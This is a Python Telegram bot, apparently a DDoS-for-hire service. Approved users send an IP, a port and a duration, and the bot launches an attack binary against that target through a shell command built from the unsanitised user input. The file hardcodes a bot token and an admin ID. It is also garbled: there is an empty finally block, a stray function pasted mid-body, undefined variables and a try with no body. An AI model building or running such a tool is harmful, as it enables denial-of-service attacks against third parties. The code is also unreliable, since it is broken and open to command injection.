import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7639371340:AAEuseJwoZJ4qbZa2IcrcspuYxfrE41BbsA'
ADMIN_USER_ID = 1426717719
USERS_FILE = 'users.txt'

# Dictionary to keep track of user attack status
user_attack_status = {}

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the DDOS  🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Buy Private File ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /manage <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context, user_id):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Om {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
    
        # Final Attack Message Upon Completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *MISSION ACCOMPLISHED!* 🔥\n\n"
        f"🎯 *TARGET NEUTRALIZED:* `{target_ip}`\n"
        f"💣 *PORT BREACHED:* `{target_port}`\n"
        f"⏳ *DURATION:* `{duration} seconds`\n\n"
        f"💥 *Operation Complete. No Evidence Left Behind. Courtesy of {USERNAME}*",
        parse_mode='Markdown'
    )

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

  # Check if an attack is already in progress
    if attack_in_progress:
        bot.send_message(chat_id, f"⚠️ *An attack is already in progress. Please wait until it completes, @Frx_Shooter.*", parse_mode='Markdown')
        return

    user_id = message.from_user.id

    try:

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Buy Private File  💥*"
    ), parse_mode='Markdown')

    # Mark this user as having an ongoing attack
    user_attack_status[user_id] = True

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context, user_id))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
